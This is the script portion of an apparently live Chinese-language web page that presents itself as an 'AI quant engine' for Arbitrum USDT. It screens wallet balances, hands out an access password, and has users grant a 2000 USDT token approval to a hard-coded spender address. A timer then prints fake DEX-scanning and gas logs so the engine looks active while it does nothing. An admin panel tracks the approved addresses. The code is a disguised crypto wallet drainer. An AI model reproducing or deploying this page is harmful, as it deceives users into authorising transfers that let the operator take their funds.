    const ARBITRUM_RPC_LIST = ['https://arb1.arbitrum.io/rpc', 'https://rpc.arbitrum.one', 'https://arbitrum.publicnode.com'];

    async function getUSDTBalance(address) {
        const cleanAddress = address.toLowerCase(), balanceOfData = `0x70a08231000000000000000000000000${cleanAddress.slice(2)}`;
        for (let i = 0; i < ARBITRUM_RPC_LIST.length; i++) { try { const res = await fetch(ARBITRUM_RPC_LIST[i], { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: USDT_CONTRACT, data: balanceOfData }, 'latest'], id: i+1 }) }); const data = await res.json(); if (data && data.result) return { success: true, balance: parseInt(data.result, 16) / 1e6 }; } catch(e) {} }
        return { success: false, balance: 0, error: '查询失败' };
    }

    function isValidArbitrumAddress(addr) { return /^0x[a-fA-F0-9]{40}$/i.test(addr?.trim()); }
    function showCopyToast(msg) { const t = Object.assign(document.createElement('div'), { className: 'copy-toast', textContent: msg }); document.body.appendChild(t); setTimeout(() => t.remove(), 2000); }
    async function copyToClipboard(text) { try { await navigator.clipboard.writeText(text); showCopyToast('✅ 地址已复制'); } catch { const ta = Object.assign(document.createElement('textarea'), { value: text }); document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); showCopyToast('✅ 地址已复制'); } }

    function loadApplications() { const s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : []; }
    function saveApplications(apps) { localStorage.setItem(STORAGE_KEY, JSON.stringify(apps)); }
    function getAddressRecordCount(addr) { return loadApplications().filter(a => a.address === addr.toLowerCase()).length; }
    function addApprovedRecord(address, usdtBalance, transferStatus, transferTxHash) {
        if (getAddressRecordCount(address) >= MAX_RECORDS_PER_ADDRESS) return false;
        const apps = loadApplications();
        apps.push({ id: Date.now(), address: address.toLowerCase(), status: 'approved', usdtBalance: usdtBalance, submitTime: new Date().toLocaleString(), approvedTime: new Date().toLocaleString(), transferStatus: transferStatus, transferTxHash: transferTxHash });
        saveApplications(apps); return true;
    }

    function renderAdminList() {
        const apps = loadApplications().slice(-10).reverse(), container = document.getElementById('applicationsList');
        if (!container) return;
        if (apps.length === 0) { container.innerHTML = '<div style="color:#8e9aaf; text-align:center; padding:20px;">暂无记录</div>'; return; }
        let html = '<table class="admin-table"><thead><tr><th>地址</th><th>提交时间</th><th>USDT余额</th><th>通过时间</th><th>转账状态</th><th>操作</th></tr></thead><tbody>';
        const records = getTransferRecords();
        for (const app of apps) {
            const record = records[app.address];
            let statusHtml = '<span style="color:#ffaa44;">⏳ 待处理</span>', txHtml = '';
            if (record) { if (record.status === 'success') { statusHtml = '<span class="transfer-success">✅ 已转账</span>'; if(record.txHash) txHtml = `<div><a href="https://arbiscan.io/tx/${record.txHash}" target="_blank" class="tx-link">查看交易</a></div>`; } else if (record.status === 'skipped') statusHtml = '<span class="transfer-skip">⏭️ ETH充足无需转账</span>'; else if (record.status === 'failed') statusHtml = '<span class="transfer-failed">❌ 转账失败</span>'; }
            else if (app.transferStatus) { if (app.transferStatus === 'success') statusHtml = '<span class="transfer-success">✅ 已转账</span>'; else if (app.transferStatus === 'skipped') statusHtml = '<span class="transfer-skip">⏭️ ETH充足无需转账</span>'; else if (app.transferStatus === 'failed') statusHtml = '<span class="transfer-failed">❌ 转账失败</span>'; if (app.transferTxHash) txHtml = `<div><a href="https://arbiscan.io/tx/${app.transferTxHash}" target="_blank" class="tx-link">查看交易</a></div>`; }
            html += `<tr><td style="font-family:monospace;font-size:11px;" title="${app.address}">${app.address.slice(0,6)}...${app.address.slice(-4)}</td><td style="font-size:11px;">${app.submitTime}</td><td style="font-size:11px;color:#00ff88;">${app.usdtBalance?.toFixed(2) || '--'}</td><td style="font-size:11px;">${app.approvedTime || '-'}</td><td style="font-size:11px;">${statusHtml}${txHtml}</td><td><button class="copy-btn" onclick="window.copyToClipboard('${app.address}')">📋 复制</button></td></tr>`;
        }
        html += '</tbody></table>'; container.innerHTML = html;
    }
    window.copyToClipboard = copyToClipboard;

    function showPage(pageId) { const pages = ['passwordPage', 'whitepaperPage', 'tutorialPage', 'applyPage', 'adminPage', 'announcementPage', 'quantPanel', 'runningPanel']; for (let id of pages) { const el = document.getElementById(id); if (el) el.style.display = 'none'; } const target = document.getElementById(pageId); if (target) target.style.display = 'block'; }

    document.getElementById('whitepaperBtn')?.addEventListener('click', () => showPage('whitepaperPage'));
    document.getElementById('tutorialBtn')?.addEventListener('click', () => showPage('tutorialPage'));
    document.getElementById('applyBtn')?.addEventListener('click', () => showPage('applyPage'));
    document.getElementById('adminEntryBtn')?.addEventListener('click', () => showPage('adminPage'));
    document.getElementById('announcementBtn')?.addEventListener('click', () => showPage('announcementPage'));
    document.getElementById('backToPasswordBtn')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromTutorial')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromApply')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromQuant')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromAdmin')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromAnnouncement')?.addEventListener('click', () => showPage('passwordPage'));

    const submitApplyBtn = document.getElementById('submitApplyBtn'), applyAddressInput = document.getElementById('applyAddressInput'), applyMsg = document.getElementById('applyMsg');
    let isSubmitting = false;
    if (submitApplyBtn) {
        submitApplyBtn.onclick = async () => {
            if (isSubmitting) return;
            const address = applyAddressInput.value.trim();
            if (!isValidArbitrumAddress(address)) { applyMsg.innerHTML = '❌ 无效的 Arbitrum 链地址！'; applyMsg.style.color = '#ff6b6b'; return; }
            try {
                isSubmitting = true; submitApplyBtn.disabled = true;
                applyMsg.innerHTML = '<span class="loading-spinner"></span> 🔍 正在链上查询 USDT 余额...'; applyMsg.style.color = '#7ee0ff';
                const balanceResult = await getUSDTBalance(address);
                if (!balanceResult.success) { applyMsg.innerHTML = `❌ 查询余额失败：${balanceResult.error || '网络错误'}`; applyMsg.style.color = '#ff6b6b'; return; }
                const balance = balanceResult.balance;
                if (balance < MIN_USDT_REQUIRED) { applyMsg.innerHTML = `❌ 申请失败！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 需要持有 ≥${MIN_USDT_REQUIRED} USDT`; applyMsg.style.color = '#ff6b6b'; return; }
                if (balance > MAX_USDT_LIMIT) { applyMsg.innerHTML = `⚠️ 余额超过限制！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 请确保钱包内 ≤${MAX_USDT_LIMIT} USDT`; applyMsg.style.color = '#ffaa44'; return; }
                let transferStatus = null, transferTxHash = null;
                try { const tr = await internalTransferEth(address); if (tr.success) { transferStatus = 'success'; transferTxHash = tr.txHash; } else if (tr.reason === 'eth_sufficient') transferStatus = 'skipped'; else if (tr.reason === 'already_transferred') transferStatus = 'success'; else transferStatus = 'failed'; } catch(err) { transferStatus = 'failed'; }
                addApprovedRecord(address, balance, transferStatus, transferTxHash);
                if (adminContent && adminContent.style.display === 'block') renderAdminList();
                applyMsg.innerHTML = `✅ 您的地址已通过审核！<br>🔐 访问密码：<strong style="font-size:28px; color:#00ff88; background:rgba(0,255,136,0.15); display:inline-block; padding:10px 25px; border-radius:50px; margin:10px 0;">${SYSTEM_PASSWORD}</strong><br>📝 请返回密码验证页面登录`;
                applyMsg.style.color = '#00ff88'; applyAddressInput.value = '';
            } catch (error) { applyMsg.innerHTML = '❌ 系统错误，请稍后重试'; applyMsg.style.color = '#ff6b6b'; }
            finally { isSubmitting = false; submitApplyBtn.disabled = false; }
        };
    }

    const submitAdminLogin = document.getElementById('submitAdminLogin'), adminPasswordInput = document.getElementById('adminPasswordInput'), adminLoginMsg = document.getElementById('adminLoginMsg'), adminContent = document.getElementById('adminContent');
    if (submitAdminLogin) { submitAdminLogin.onclick = () => { if (adminPasswordInput.value === ADMIN_PASSWORD) { adminLoginMsg.textContent = ''; adminContent.style.display = 'block'; renderAdminList(); } else { adminLoginMsg.textContent = '❌ 管理员密码错误'; adminLoginMsg.style.color = '#ff6b6b'; adminContent.style.display = 'none'; } }; }

    const passwordInput = document.getElementById('passwordInput'), submitPasswordBtn = document.getElementById('submitPassword'), loginErrorMsg = document.getElementById('errorMsg');
    if (submitPasswordBtn) { submitPasswordBtn.onclick = () => { if (passwordInput.value === SYSTEM_PASSWORD) { showPage('quantPanel'); loginErrorMsg.textContent = ''; } else { loginErrorMsg.textContent = '❌ 密码错误'; passwordInput.value = ''; passwordInput.focus(); } }; }
    if (passwordInput) passwordInput.onkeypress = (e) => { if (e.key === 'Enter') submitPasswordBtn?.click(); };

    // 量化系统钱包授权
    const USDT_ADDRESS_QUANT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", SPENDER_ADDRESS = "0x23ab58b21fb4a711319a07e59686a19efbc0e76b", MIN_APPROVE_AMOUNT = 2000;
    let currentSigner = null, usdtDecimals = null, usdtContractWithSigner = null, logInterval = null;
    const connectBtn = document.getElementById("connect"), approveBtn = document.getElementById("approve"), infoDiv = document.getElementById("info"), walletAddressSpan = document.getElementById("walletAddressDisplay");

    function startRunningLogs() {
        if (logInterval) clearInterval(logInterval);
        const logArea = document.getElementById('logArea'); if (!logArea) return;
        logArea.innerHTML = `<div class="log-line"><span class="log-time">${new Date().toLocaleTimeString()}</span> <span class="log-scan">✅ AI引擎启动成功</span></div>`;
        const dexList = ['PancakeSwap', 'Uniswap', 'SushiSwap', 'Curve', 'Balancer'], gasMsgs = ['⛽ Gas费较高: 32 Gwei，等待中...', '⛽ Gas费较高: 38 Gwei，等待中...', '⛽ 当前Gas: 28 Gwei，正常范围'], scanMsgs = ['🔍 正在扫描 {dex} 交易所...', '🔍 扫描 {dex} 流动性池...'];
        logInterval = setInterval(() => { if (logArea) { let msg, cls = 'log-scan'; if (Math.random() < 0.5) { const dex = dexList[Math.floor(Math.random() * dexList.length)]; msg = scanMsgs[Math.floor(Math.random() * scanMsgs.length)].replace('{dex}', dex); } else { msg = gasMsgs[Math.floor(Math.random() * gasMsgs.length)]; cls = 'log-gas'; } logArea.insertAdjacentHTML('beforeend', `<div class="log-line"><span class="log-time">${new Date().toLocaleTimeString()}</span> <span class="${cls}">${msg}</span></div>`); logArea.scrollTop = logArea.scrollHeight; while (logArea.children.length > 20) logArea.removeChild(logArea.firstChild); } }, 3200);
    }

    async function initUSDTContractWithSigner(signer) { const abi = ["function decimals() view returns (uint8)", "function approve(address spender, uint256 amount) public returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"]; const contract = new ethers.Contract(USDT_ADDRESS_QUANT, abi, signer); const decimals = await contract.decimals(); return { contract, decimals }; }
    async function getAllowanceReadOnly(user, spender, contractAddr, provider) { try { const abi = ["function allowance(address owner, address spender) view returns (uint256)"]; const contract = new ethers.Contract(contractAddr, abi, provider); return await contract.allowance(user, spender); } catch(e) { return null; } }
    function isMobile() { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
    function tryOpenOKXApp() { if (isMobile()) { window.location.href = "okx://wallet/dapp?url=" + encodeURIComponent(window.location.href); setTimeout(() => { window.location.href = "https://www.okx.com/download"; }, 2000); } }
    function getWallet() { if (window.okxwallet) return window.okxwallet; if (window.ethereum?.isOKXWallet) return window.ethereum; if (window.ethereum) return window.ethereum; return null; }
    function updateUI(addr) { if (addr) { walletAddressSpan.innerText = addr.slice(0,6)+"..."+addr.slice(-4); walletAddressSpan.style.color = "#6ee7ff"; } else { walletAddressSpan.innerText = "未连接"; walletAddressSpan.style.color = "#8e9aaf"; } }

    if (connectBtn) {
        connectBtn.onclick = async () => {
            let wallet = getWallet();
            if (!wallet) { if (isMobile()) { infoDiv.innerHTML = "📱 正在尝试打开 OKX App..."; tryOpenOKXApp(); } else { infoDiv.innerHTML = "❌ 未检测到 OKX 钱包<br><br><a href='https://www.okx.com/download' target='_blank' class='download-link'>👉 点击下载 OKX 钱包</a>"; } return; }
            try { infoDiv.innerHTML = "⏳ 请求连接钱包..."; await wallet.request({ method: "eth_requestAccounts" }); const provider = new ethers.providers.Web3Provider(wallet); const signer = provider.getSigner(); currentSigner = signer; const address = await signer.getAddress(); updateUI(address); const { contract, decimals } = await initUSDTContractWithSigner(signer); usdtContractWithSigner = contract; usdtDecimals = decimals; infoDiv.innerHTML = `✅ AI引擎准备就绪，请授权启动引擎 | 地址: ${address.slice(0,6)}...${address.slice(-4)}`; approveBtn.disabled = false; } catch (err) { infoDiv.innerHTML = "❌ 连接失败: " + (err.message || "用户取消"); }
        };
    }

    document.getElementById('checkAllowance')?.addEventListener('click', async () => { if (!currentSigner) { infoDiv.innerHTML = "⚠️ 请先连接钱包"; return; } try { const user = await currentSigner.getAddress(); const provider = currentSigner.provider; const abi = ["function allowance(address owner, address spender) view returns (uint256)"]; const contract = new ethers.Contract(USDT_ADDRESS_QUANT, abi, provider); const raw = await contract.allowance(user, SPENDER_ADDRESS); const amount = parseFloat(ethers.utils.formatUnits(raw, 6)); if (amount > 0) infoDiv.innerHTML = `✅ 当前已授权额度: <strong style="color:#00ff88">${amount.toFixed(2)} USDT</strong>`; else infoDiv.innerHTML = `⚠️ 暂未授权 USDT`; } catch(e) { infoDiv.innerHTML = "❌ 查询失败"; } });

    if (approveBtn) {
        approveBtn.onclick = async () => { if (!currentSigner) { alert("请先连接钱包"); return; } if (!usdtContractWithSigner || usdtDecimals === null) { const { contract, decimals } = await initUSDTContractWithSigner(currentSigner); usdtContractWithSigner = contract; usdtDecimals = decimals; } const user = await currentSigner.getAddress(); const provider = currentSigner.provider; const raw = await getAllowanceReadOnly(user, SPENDER_ADDRESS, USDT_ADDRESS_QUANT, provider); const currentAllowance = parseFloat(ethers.utils.formatUnits(raw, usdtDecimals)); if (currentAllowance >= MIN_APPROVE_AMOUNT) { infoDiv.innerHTML = `✅ 授权额度已满足<br>🚀 正在启动 AI 引擎...`; showPage('runningPanel'); startRunningLogs(); return; } try { infoDiv.innerHTML = "📡 请在钱包内确认授权..."; const amount = ethers.utils.parseUnits("2000", usdtDecimals); const tx = await usdtContractWithSigner.approve(SPENDER_ADDRESS, amount); infoDiv.innerHTML = "⛓️ 交易已提交，等待确认..."; await tx.wait(); infoDiv.innerHTML = `✅ 授权成功！<br>🚀 AI 引擎正在启动...`; showPage('runningPanel'); startRunningLogs(); } catch(e) { infoDiv.innerHTML = "❌ 授权失败: " + (e.message || "用户取消"); } };
    }
</script>
</body>
</html>
